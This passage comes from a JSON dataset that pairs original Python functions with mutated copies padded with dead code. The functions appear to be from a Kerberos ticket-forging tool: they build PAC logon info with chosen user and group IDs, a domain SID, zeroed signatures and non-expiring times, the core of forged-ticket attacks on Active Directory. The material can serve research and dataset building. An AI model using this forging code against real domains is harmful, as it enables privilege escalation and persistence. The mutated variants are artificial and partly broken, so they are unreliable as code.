            "def createBasicValidationInfo(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    kerbdata = KERB_VALIDATION_INFO()\n    aTime = timegm(datetime.datetime.utcnow().timetuple())\n    unixTime = self.getFileTime(aTime)\n    kerbdata['LogonTime']['dwLowDateTime'] = unixTime & 4294967295\n    kerbdata['LogonTime']['dwHighDateTime'] = unixTime >> 32\n    kerbdata['LogoffTime']['dwLowDateTime'] = 4294967295\n    kerbdata['LogoffTime']['dwHighDateTime'] = 2147483647\n    kerbdata['KickOffTime']['dwLowDateTime'] = 4294967295\n    kerbdata['KickOffTime']['dwHighDateTime'] = 2147483647\n    kerbdata['PasswordLastSet']['dwLowDateTime'] = unixTime & 4294967295\n    kerbdata['PasswordLastSet']['dwHighDateTime'] = unixTime >> 32\n    kerbdata['PasswordCanChange']['dwLowDateTime'] = 0\n    kerbdata['PasswordCanChange']['dwHighDateTime'] = 0\n    kerbdata['PasswordMustChange']['dwLowDateTime'] = 4294967295\n    kerbdata['PasswordMustChange']['dwHighDateTime'] = 2147483647\n    kerbdata['EffectiveName'] = self.__target\n    kerbdata['FullName'] = ''\n    kerbdata['LogonScript'] = ''\n    kerbdata['ProfilePath'] = ''\n    kerbdata['HomeDirectory'] = ''\n    kerbdata['HomeDirectoryDrive'] = ''\n    kerbdata['LogonCount'] = 500\n    kerbdata['BadPasswordCount'] = 0\n    kerbdata['UserId'] = int(self.__options.user_id)\n    groups = self.__options.groups.split(',')\n    if len(groups) == 0:\n        kerbdata['PrimaryGroupId'] = 513\n    else:\n        kerbdata['PrimaryGroupId'] = int(groups[0])\n    kerbdata['GroupCount'] = len(groups)\n    for group in groups:\n        groupMembership = GROUP_MEMBERSHIP()\n        groupId = NDRULONG()\n        groupId['Data'] = int(group)\n        groupMembership['RelativeId'] = groupId\n        groupMembership['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED\n        kerbdata['GroupIds'].append(groupMembership)\n    kerbdata['UserFlags'] = 0\n    kerbdata['UserSessionKey'] = b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n    kerbdata['LogonServer'] = ''\n    kerbdata['LogonDomainName'] = self.__domain.upper()\n    kerbdata['LogonDomainId'].fromCanonical(self.__options.domain_sid)\n    kerbdata['LMKey'] = b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n    kerbdata['UserAccountControl'] = USER_NORMAL_ACCOUNT | USER_DONT_EXPIRE_PASSWORD\n    kerbdata['SubAuthStatus'] = 0\n    kerbdata['LastSuccessfulILogon']['dwLowDateTime'] = 0\n    kerbdata['LastSuccessfulILogon']['dwHighDateTime'] = 0\n    kerbdata['LastFailedILogon']['dwLowDateTime'] = 0\n    kerbdata['LastFailedILogon']['dwHighDateTime'] = 0\n    kerbdata['FailedILogonCount'] = 0\n    kerbdata['Reserved3'] = 0\n    kerbdata['ResourceGroupDomainSid'] = NULL\n    kerbdata['ResourceGroupCount'] = 0\n    kerbdata['ResourceGroupIds'] = NULL\n    validationInfo = VALIDATION_INFO()\n    validationInfo['Data'] = kerbdata\n    return validationInfo"
        ]
    },
    {
        "func_name": "createBasicPac",
        "original": "def createBasicPac(self, kdcRep):\n    validationInfo = self.createBasicValidationInfo()\n    pacInfos = {}\n    pacInfos[PAC_LOGON_INFO] = validationInfo.getData() + validationInfo.getDataReferents()\n    srvCheckSum = PAC_SIGNATURE_DATA()\n    privCheckSum = PAC_SIGNATURE_DATA()\n    if kdcRep['ticket']['enc-part']['etype'] == EncryptionTypes.rc4_hmac.value:\n        srvCheckSum['SignatureType'] = ChecksumTypes.hmac_md5.value\n        privCheckSum['SignatureType'] = ChecksumTypes.hmac_md5.value\n        srvCheckSum['Signature'] = b'\\x00' * 16\n        privCheckSum['Signature'] = b'\\x00' * 16\n    else:\n        srvCheckSum['Signature'] = b'\\x00' * 12\n        privCheckSum['Signature'] = b'\\x00' * 12\n        if len(self.__options.aesKey) == 64:\n            srvCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes256.value\n            privCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes256.value\n        else:\n            srvCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes128.value\n            privCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes128.value\n    pacInfos[PAC_SERVER_CHECKSUM] = srvCheckSum.getData()\n    pacInfos[PAC_PRIVSVR_CHECKSUM] = privCheckSum.getData()\n    clientInfo = PAC_CLIENT_INFO()\n    clientInfo['Name'] = self.__target.encode('utf-16le')\n    clientInfo['NameLength'] = len(clientInfo['Name'])\n    pacInfos[PAC_CLIENT_INFO_TYPE] = clientInfo.getData()\n    if self.__options.extra_pac:\n        self.createUpnDnsPac(pacInfos)\n    if self.__options.old_pac is False:\n        self.createAttributesInfoPac(pacInfos)\n        self.createRequestorInfoPac(pacInfos)\n    return pacInfos",
        "mutated": [
            "def createBasicPac(self, kdcRep):\n    if False:\n        i = 10\n    validationInfo = self.createBasicValidationInfo()\n    pacInfos = {}\n    pacInfos[PAC_LOGON_INFO] = validationInfo.getData() + validationInfo.getDataReferents()\n    srvCheckSum = PAC_SIGNATURE_DATA()\n    privCheckSum = PAC_SIGNATURE_DATA()\n    if kdcRep['ticket']['enc-part']['etype'] == EncryptionTypes.rc4_hmac.value:\n        srvCheckSum['SignatureType'] = ChecksumTypes.hmac_md5.value\n        privCheckSum['SignatureType'] = ChecksumTypes.hmac_md5.value\n        srvCheckSum['Signature'] = b'\\x00' * 16\n        privCheckSum['Signature'] = b'\\x00' * 16\n    else:\n        srvCheckSum['Signature'] = b'\\x00' * 12\n        privCheckSum['Signature'] = b'\\x00' * 12\n        if len(self.__options.aesKey) == 64:\n            srvCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes256.value\n            privCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes256.value\n        else:\n            srvCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes128.value\n            privCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes128.value\n    pacInfos[PAC_SERVER_CHECKSUM] = srvCheckSum.getData()\n    pacInfos[PAC_PRIVSVR_CHECKSUM] = privCheckSum.getData()\n    clientInfo = PAC_CLIENT_INFO()\n    clientInfo['Name'] = self.__target.encode('utf-16le')\n    clientInfo['NameLength'] = len(clientInfo['Name'])\n    pacInfos[PAC_CLIENT_INFO_TYPE] = clientInfo.getData()\n    if self.__options.extra_pac:\n        self.createUpnDnsPac(pacInfos)\n    if self.__options.old_pac is False:\n        self.createAttributesInfoPac(pacInfos)\n        self.createRequestorInfoPac(pacInfos)\n    return pacInfos",
            "def createBasicPac(self, kdcRep):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    validationInfo = self.createBasicValidationInfo()\n    pacInfos = {}\n    pacInfos[PAC_LOGON_INFO] = validationInfo.getData() + validationInfo.getDataReferents()\n    srvCheckSum = PAC_SIGNATURE_DATA()\n    privCheckSum = PAC_SIGNATURE_DATA()\n    if kdcRep['ticket']['enc-part']['etype'] == EncryptionTypes.rc4_hmac.value:\n        srvCheckSum['SignatureType'] = ChecksumTypes.hmac_md5.value\n        privCheckSum['SignatureType'] = ChecksumTypes.hmac_md5.value\n        srvCheckSum['Signature'] = b'\\x00' * 16\n        privCheckSum['Signature'] = b'\\x00' * 16\n    else:\n        srvCheckSum['Signature'] = b'\\x00' * 12\n        privCheckSum['Signature'] = b'\\x00' * 12\n        if len(self.__options.aesKey) == 64:\n            srvCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes256.value\n            privCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes256.value\n        else:\n            srvCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes128.value\n            privCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes128.value\n    pacInfos[PAC_SERVER_CHECKSUM] = srvCheckSum.getData()\n    pacInfos[PAC_PRIVSVR_CHECKSUM] = privCheckSum.getData()\n    clientInfo = PAC_CLIENT_INFO()\n    clientInfo['Name'] = self.__target.encode('utf-16le')\n    clientInfo['NameLength'] = len(clientInfo['Name'])\n    pacInfos[PAC_CLIENT_INFO_TYPE] = clientInfo.getData()\n    if self.__options.extra_pac:\n        self.createUpnDnsPac(pacInfos)\n    if self.__options.old_pac is False:\n        self.createAttributesInfoPac(pacInfos)\n        self.createRequestorInfoPac(pacInfos)\n    return pacInfos",
            "def createBasicPac(self, kdcRep):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    validationInfo = self.createBasicValidationInfo()\n    pacInfos = {}\n    pacInfos[PAC_LOGON_INFO] = validationInfo.getData() + validationInfo.getDataReferents()\n    srvCheckSum = PAC_SIGNATURE_DATA()\n    privCheckSum = PAC_SIGNATURE_DATA()\n    if kdcRep['ticket']['enc-part']['etype'] == EncryptionTypes.rc4_hmac.value:\n        srvCheckSum['SignatureType'] = ChecksumTypes.hmac_md5.value\n        privCheckSum['SignatureType'] = ChecksumTypes.hmac_md5.value\n        srvCheckSum['Signature'] = b'\\x00' * 16\n        privCheckSum['Signature'] = b'\\x00' * 16\n    else:\n        srvCheckSum['Signature'] = b'\\x00' * 12\n        privCheckSum['Signature'] = b'\\x00' * 12\n        if len(self.__options.aesKey) == 64:\n            srvCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes256.value\n            privCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes256.value\n        else:\n            srvCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes128.value\n            privCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes128.value\n    pacInfos[PAC_SERVER_CHECKSUM] = srvCheckSum.getData()\n    pacInfos[PAC_PRIVSVR_CHECKSUM] = privCheckSum.getData()\n    clientInfo = PAC_CLIENT_INFO()\n    clientInfo['Name'] = self.__target.encode('utf-16le')\n    clientInfo['NameLength'] = len(clientInfo['Name'])\n    pacInfos[PAC_CLIENT_INFO_TYPE] = clientInfo.getData()\n    if self.__options.extra_pac:\n        self.createUpnDnsPac(pacInfos)\n    if self.__options.old_pac is False:\n        self.createAttributesInfoPac(pacInfos)\n        self.createRequestorInfoPac(pacInfos)\n    return pacInfos",
            "def createBasicPac(self, kdcRep):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    validationInfo = self.createBasicValidationInfo()\n    pacInfos = {}\n    pacInfos[PAC_LOGON_INFO] = validationInfo.getData() + validationInfo.getDataReferents()\n    srvCheckSum = PAC_SIGNATURE_DATA()\n    privCheckSum = PAC_SIGNATURE_DATA()\n    if kdcRep['ticket']['enc-part']['etype'] == EncryptionTypes.rc4_hmac.value:\n        srvCheckSum['SignatureType'] = ChecksumTypes.hmac_md5.value\n        privCheckSum['SignatureType'] = ChecksumTypes.hmac_md5.value\n        srvCheckSum['Signature'] = b'\\x00' * 16\n        privCheckSum['Signature'] = b'\\x00' * 16\n    else:\n        srvCheckSum['Signature'] = b'\\x00' * 12\n        privCheckSum['Signature'] = b'\\x00' * 12\n        if len(self.__options.aesKey) == 64:\n            srvCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes256.value\n            privCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes256.value\n        else:\n            srvCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes128.value\n            privCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes128.value\n    pacInfos[PAC_SERVER_CHECKSUM] = srvCheckSum.getData()\n    pacInfos[PAC_PRIVSVR_CHECKSUM] = privCheckSum.getData()\n    clientInfo = PAC_CLIENT_INFO()\n    clientInfo['Name'] = self.__target.encode('utf-16le')\n    clientInfo['NameLength'] = len(clientInfo['Name'])\n    pacInfos[PAC_CLIENT_INFO_TYPE] = clientInfo.getData()\n    if self.__options.extra_pac:\n        self.createUpnDnsPac(pacInfos)\n    if self.__options.old_pac is False:\n        self.createAttributesInfoPac(pacInfos)\n        self.createRequestorInfoPac(pacInfos)\n    return pacInfos",
            "def createBasicPac(self, kdcRep):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    validationInfo = self.createBasicValidationInfo()\n    pacInfos = {}\n    pacInfos[PAC_LOGON_INFO] = validationInfo.getData() + validationInfo.getDataReferents()\n    srvCheckSum = PAC_SIGNATURE_DATA()\n    privCheckSum = PAC_SIGNATURE_DATA()\n    if kdcRep['ticket']['enc-part']['etype'] == EncryptionTypes.rc4_hmac.value:\n        srvCheckSum['SignatureType'] = ChecksumTypes.hmac_md5.value\n        privCheckSum['SignatureType'] = ChecksumTypes.hmac_md5.value\n        srvCheckSum['Signature'] = b'\\x00' * 16\n        privCheckSum['Signature'] = b'\\x00' * 16\n    else:\n        srvCheckSum['Signature'] = b'\\x00' * 12\n        privCheckSum['Signature'] = b'\\x00' * 12\n        if len(self.__options.aesKey) == 64:\n            srvCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes256.value\n            privCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes256.value\n        else:\n            srvCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes128.value\n            privCheckSum['SignatureType'] = ChecksumTypes.hmac_sha1_96_aes128.value\n    pacInfos[PAC_SERVER_CHECKSUM] = srvCheckSum.getData()\n    pacInfos[PAC_PRIVSVR_CHECKSUM] = privCheckSum.getData()\n    clientInfo = PAC_CLIENT_INFO()\n    clientInfo['Name'] = self.__target.encode('utf-16le')\n    clientInfo['NameLength'] = len(clientInfo['Name'])\n    pacInfos[PAC_CLIENT_INFO_TYPE] = clientInfo.getData()\n    if self.__options.extra_pac:\n        self.createUpnDnsPac(pacInfos)\n    if self.__options.old_pac is False:\n        self.createAttributesInfoPac(pacInfos)\n        self.createRequestorInfoPac(pacInfos)\n    return pacInfos"
        ]
    },
    {
        "func_name": "createUpnDnsPac",
        "original": "def createUpnDnsPac(self, pacInfos):\n    upnDnsInfo = UPN_DNS_INFO_FULL()\n    PAC_pad = b'\\x00' * self.getPadLength(len(upnDnsInfo))\n    upn_data = f'{self.__target.lower()}@{self.__domain.lower()}'.encode('utf-16-le')\n    upnDnsInfo['UpnLength'] = len(upn_data)\n    upnDnsInfo['UpnOffset'] = len(upnDnsInfo) + len(PAC_pad)\n    total_len = upnDnsInfo['UpnOffset'] + upnDnsInfo['UpnLength']\n    pad = self.getPadLength(total_len)\n    upn_data += b'\\x00' * pad\n    dns_name = self.__domain.upper().encode('utf-16-le')\n    upnDnsInfo['DnsDomainNameLength'] = len(dns_name)\n    upnDnsInfo['DnsDomainNameOffset'] = total_len + pad\n    total_len = upnDnsInfo['DnsDomainNameOffset'] + upnDnsInfo['DnsDomainNameLength']\n    pad = self.getPadLength(total_len)\n    dns_name += b'\\x00' * pad\n    upnDnsInfo['Flags'] = 2\n    samName = self.__target.encode('utf-16-le')\n    upnDnsInfo['SamNameLength'] = len(samName)\n    upnDnsInfo['SamNameOffset'] = total_len + pad\n    total_len = upnDnsInfo['SamNameOffset'] + upnDnsInfo['SamNameLength']\n    pad = self.getPadLength(total_len)\n    samName += b'\\x00' * pad\n    user_sid = SID()\n    user_sid.fromCanonical(f'{self.__options.domain_sid}-{self.__options.user_id}')\n    upnDnsInfo['SidLength'] = len(user_sid)\n    upnDnsInfo['SidOffset'] = total_len + pad\n    total_len = upnDnsInfo['SidOffset'] + upnDnsInfo['SidLength']\n    pad = self.getPadLength(total_len)\n    user_data = user_sid.getData() + b'\\x00' * pad\n    post_pac_data = upn_data + dns_name + samName + user_data\n    pacInfos[PAC_UPN_DNS_INFO] = upnDnsInfo.getData() + PAC_pad + post_pac_data",
        "mutated": [
            "def createUpnDnsPac(self, pacInfos):\n    if False:\n        i = 10\n    upnDnsInfo = UPN_DNS_INFO_FULL()\n    PAC_pad = b'\\x00' * self.getPadLength(len(upnDnsInfo))\n    upn_data = f'{self.__target.lower()}@{self.__domain.lower()}'.encode('utf-16-le')\n    upnDnsInfo['UpnLength'] = len(upn_data)\n    upnDnsInfo['UpnOffset'] = len(upnDnsInfo) + len(PAC_pad)\n    total_len = upnDnsInfo['UpnOffset'] + upnDnsInfo['UpnLength']\n    pad = self.getPadLength(total_len)\n    upn_data += b'\\x00' * pad\n    dns_name = self.__domain.upper().encode('utf-16-le')\n    upnDnsInfo['DnsDomainNameLength'] = len(dns_name)\n    upnDnsInfo['DnsDomainNameOffset'] = total_len + pad\n    total_len = upnDnsInfo['DnsDomainNameOffset'] + upnDnsInfo['DnsDomainNameLength']\n    pad = self.getPadLength(total_len)\n    dns_name += b'\\x00' * pad\n    upnDnsInfo['Flags'] = 2\n    samName = self.__target.encode('utf-16-le')\n    upnDnsInfo['SamNameLength'] = len(samName)\n    upnDnsInfo['SamNameOffset'] = total_len + pad\n    total_len = upnDnsInfo['SamNameOffset'] + upnDnsInfo['SamNameLength']\n    pad = self.getPadLength(total_len)\n    samName += b'\\x00' * pad\n    user_sid = SID()\n    user_sid.fromCanonical(f'{self.__options.domain_sid}-{self.__options.user_id}')\n    upnDnsInfo['SidLength'] = len(user_sid)\n    upnDnsInfo['SidOffset'] = total_len + pad\n    total_len = upnDnsInfo['SidOffset'] + upnDnsInfo['SidLength']\n    pad = self.getPadLength(total_len)\n    user_data = user_sid.getData() + b'\\x00' * pad\n    post_pac_data = upn_data + dns_name + samName + user_data\n    pacInfos[PAC_UPN_DNS_INFO] = upnDnsInfo.getData() + PAC_pad + post_pac_data",
            "def createUpnDnsPac(self, pacInfos):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    upnDnsInfo = UPN_DNS_INFO_FULL()\n    PAC_pad = b'\\x00' * self.getPadLength(len(upnDnsInfo))\n    upn_data = f'{self.__target.lower()}@{self.__domain.lower()}'.encode('utf-16-le')\n    upnDnsInfo['UpnLength'] = len(upn_data)\n    upnDnsInfo['UpnOffset'] = len(upnDnsInfo) + len(PAC_pad)\n    total_len = upnDnsInfo['UpnOffset'] + upnDnsInfo['UpnLength']\n    pad = self.getPadLength(total_len)\n    upn_data += b'\\x00' * pad\n    dns_name = self.__domain.upper().encode('utf-16-le')\n    upnDnsInfo['DnsDomainNameLength'] = len(dns_name)\n    upnDnsInfo['DnsDomainNameOffset'] = total_len + pad\n    total_len = upnDnsInfo['DnsDomainNameOffset'] + upnDnsInfo['DnsDomainNameLength']\n    pad = self.getPadLength(total_len)\n    dns_name += b'\\x00' * pad\n    upnDnsInfo['Flags'] = 2\n    samName = self.__target.encode('utf-16-le')\n    upnDnsInfo['SamNameLength'] = len(samName)\n    upnDnsInfo['SamNameOffset'] = total_len + pad\n    total_len = upnDnsInfo['SamNameOffset'] + upnDnsInfo['SamNameLength']\n    pad = self.getPadLength(total_len)\n    samName += b'\\x00' * pad\n    user_sid = SID()\n    user_sid.fromCanonical(f'{self.__options.domain_sid}-{self.__options.user_id}')\n    upnDnsInfo['SidLength'] = len(user_sid)\n    upnDnsInfo['SidOffset'] = total_len + pad\n    total_len = upnDnsInfo['SidOffset'] + upnDnsInfo['SidLength']\n    pad = self.getPadLength(total_len)\n    user_data = user_sid.getData() + b'\\x00' * pad\n    post_pac_data = upn_data + dns_name + samName + user_data\n    pacInfos[PAC_UPN_DNS_INFO] = upnDnsInfo.getData() + PAC_pad + post_pac_data",
            "def createUpnDnsPac(self, pacInfos):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    upnDnsInfo = UPN_DNS_INFO_FULL()\n    PAC_pad = b'\\x00' * self.getPadLength(len(upnDnsInfo))\n    upn_data = f'{self.__target.lower()}@{self.__domain.lower()}'.encode('utf-16-le')\n    upnDnsInfo['UpnLength'] = len(upn_data)\n    upnDnsInfo['UpnOffset'] = len(upnDnsInfo) + len(PAC_pad)\n    total_len = upnDnsInfo['UpnOffset'] + upnDnsInfo['UpnLength']\n    pad = self.getPadLength(total_len)\n    upn_data += b'\\x00' * pad\n    dns_name = self.__domain.upper().encode('utf-16-le')\n    upnDnsInfo['DnsDomainNameLength'] = len(dns_name)\n    upnDnsInfo['DnsDomainNameOffset'] = total_len + pad\n    total_len = upnDnsInfo['DnsDomainNameOffset'] + upnDnsInfo['DnsDomainNameLength']\n    pad = self.getPadLength(total_len)\n    dns_name += b'\\x00' * pad\n    upnDnsInfo['Flags'] = 2\n    samName = self.__target.encode('utf-16-le')\n    upnDnsInfo['SamNameLength'] = len(samName)\n    upnDnsInfo['SamNameOffset'] = total_len + pad\n    total_len = upnDnsInfo['SamNameOffset'] + upnDnsInfo['SamNameLength']\n    pad = self.getPadLength(total_len)\n    samName += b'\\x00' * pad\n    user_sid = SID()\n    user_sid.fromCanonical(f'{self.__options.domain_sid}-{self.__options.user_id}')\n    upnDnsInfo['SidLength'] = len(user_sid)\n    upnDnsInfo['SidOffset'] = total_len + pad\n    total_len = upnDnsInfo['SidOffset'] + upnDnsInfo['SidLength']\n    pad = self.getPadLength(total_len)\n    user_data = user_sid.getData() + b'\\x00' * pad\n    post_pac_data = upn_data + dns_name + samName + user_data\n    pacInfos[PAC_UPN_DNS_INFO] = upnDnsInfo.getData() + PAC_pad + post_pac_data",
            "def createUpnDnsPac(self, pacInfos):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    upnDnsInfo = UPN_DNS_INFO_FULL()\n    PAC_pad = b'\\x00' * self.getPadLength(len(upnDnsInfo))\n    upn_data = f'{self.__target.lower()}@{self.__domain.lower()}'.encode('utf-16-le')\n    upnDnsInfo['UpnLength'] = len(upn_data)\n    upnDnsInfo['UpnOffset'] = len(upnDnsInfo) + len(PAC_pad)\n    total_len = upnDnsInfo['UpnOffset'] + upnDnsInfo['UpnLength']\n    pad = self.getPadLength(total_len)\n    upn_data += b'\\x00' * pad\n    dns_name = self.__domain.upper().encode('utf-16-le')\n    upnDnsInfo['DnsDomainNameLength'] = len(dns_name)\n    upnDnsInfo['DnsDomainNameOffset'] = total_len + pad\n    total_len = upnDnsInfo['DnsDomainNameOffset'] + upnDnsInfo['DnsDomainNameLength']\n    pad = self.getPadLength(total_len)\n    dns_name += b'\\x00' * pad\n    upnDnsInfo['Flags'] = 2\n    samName = self.__target.encode('utf-16-le')\n    upnDnsInfo['SamNameLength'] = len(samName)\n    upnDnsInfo['SamNameOffset'] = total_len + pad\n    total_len = upnDnsInfo['SamNameOffset'] + upnDnsInfo['SamNameLength']\n    pad = self.getPadLength(total_len)\n    samName += b'\\x00' * pad\n    user_sid = SID()\n    user_sid.fromCanonical(f'{self.__options.domain_sid}-{self.__options.user_id}')\n    upnDnsInfo['SidLength'] = len(user_sid)\n    upnDnsInfo['SidOffset'] = total_len + pad\n    total_len = upnDnsInfo['SidOffset'] + upnDnsInfo['SidLength']\n    pad = self.getPadLength(total_len)\n    user_data = user_sid.getData() + b'\\x00' * pad\n    post_pac_data = upn_data + dns_name + samName + user_data\n    pacInfos[PAC_UPN_DNS_INFO] = upnDnsInfo.getData() + PAC_pad + post_pac_data",
            "def createUpnDnsPac(self, pacInfos):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    upnDnsInfo = UPN_DNS_INFO_FULL()\n    PAC_pad = b'\\x00' * self.getPadLength(len(upnDnsInfo))\n    upn_data = f'{self.__target.lower()}@{self.__domain.lower()}'.encode('utf-16-le')\n    upnDnsInfo['UpnLength'] = len(upn_data)\n    upnDnsInfo['UpnOffset'] = len(upnDnsInfo) + len(PAC_pad)\n    total_len = upnDnsInfo['UpnOffset'] + upnDnsInfo['UpnLength']\n    pad = self.getPadLength(total_len)\n    upn_data += b'\\x00' * pad\n    dns_name = self.__domain.upper().encode('utf-16-le')\n    upnDnsInfo['DnsDomainNameLength'] = len(dns_name)\n    upnDnsInfo['DnsDomainNameOffset'] = total_len + pad\n    total_len = upnDnsInfo['DnsDomainNameOffset'] + upnDnsInfo['DnsDomainNameLength']\n    pad = self.getPadLength(total_len)\n    dns_name += b'\\x00' * pad\n    upnDnsInfo['Flags'] = 2\n    samName = self.__target.encode('utf-16-le')\n    upnDnsInfo['SamNameLength'] = len(samName)\n    upnDnsInfo['SamNameOffset'] = total_len + pad\n    total_len = upnDnsInfo['SamNameOffset'] + upnDnsInfo['SamNameLength']\n    pad = self.getPadLength(total_len)\n    samName += b'\\x00' * pad\n    user_sid = SID()\n    user_sid.fromCanonical(f'{self.__options.domain_sid}-{self.__options.user_id}')\n    upnDnsInfo['SidLength'] = len(user_sid)\n    upnDnsInfo['SidOffset'] = total_len + pad\n    total_len = upnDnsInfo['SidOffset'] + upnDnsInfo['SidLength']\n    pad = self.getPadLength(total_len)\n    user_data = user_sid.getData() + b'\\x00' * pad\n    post_pac_data = upn_data + dns_name + samName + user_data\n    pacInfos[PAC_UPN_DNS_INFO] = upnDnsInfo.getData() + PAC_pad + post_pac_data"
        ]
    },
    {
        "func_name": "createAttributesInfoPac",
        "original": "@staticmethod\ndef createAttributesInfoPac(pacInfos):\n    pacAttributes = PAC_ATTRIBUTE_INFO()\n    pacAttributes['FlagsLength'] = 2\n    pacAttributes['Flags'] = 1\n    pacInfos[PAC_ATTRIBUTES_INFO] = pacAttributes.getData()",
        "mutated": [
            "@staticmethod\ndef createAttributesInfoPac(pacInfos):\n    if False:\n        i = 10\n    pacAttributes = PAC_ATTRIBUTE_INFO()\n    pacAttributes['FlagsLength'] = 2\n    pacAttributes['Flags'] = 1\n    pacInfos[PAC_ATTRIBUTES_INFO] = pacAttributes.getData()",
            "@staticmethod\ndef createAttributesInfoPac(pacInfos):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    pacAttributes = PAC_ATTRIBUTE_INFO()\n    pacAttributes['FlagsLength'] = 2\n    pacAttributes['Flags'] = 1\n    pacInfos[PAC_ATTRIBUTES_INFO] = pacAttributes.getData()",
            "@staticmethod\ndef createAttributesInfoPac(pacInfos):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    pacAttributes = PAC_ATTRIBUTE_INFO()\n    pacAttributes['FlagsLength'] = 2\n    pacAttributes['Flags'] = 1\n    pacInfos[PAC_ATTRIBUTES_INFO] = pacAttributes.getData()",
            "@staticmethod\ndef createAttributesInfoPac(pacInfos):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    pacAttributes = PAC_ATTRIBUTE_INFO()\n    pacAttributes['FlagsLength'] = 2\n    pacAttributes['Flags'] = 1\n    pacInfos[PAC_ATTRIBUTES_INFO] = pacAttributes.getData()",
            "@staticmethod\ndef createAttributesInfoPac(pacInfos):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    pacAttributes = PAC_ATTRIBUTE_INFO()\n    pacAttributes['FlagsLength'] = 2\n    pacAttributes['Flags'] = 1\n    pacInfos[PAC_ATTRIBUTES_INFO] = pacAttributes.getData()"
        ]
    },
    {
        "func_name": "createRequestorInfoPac",
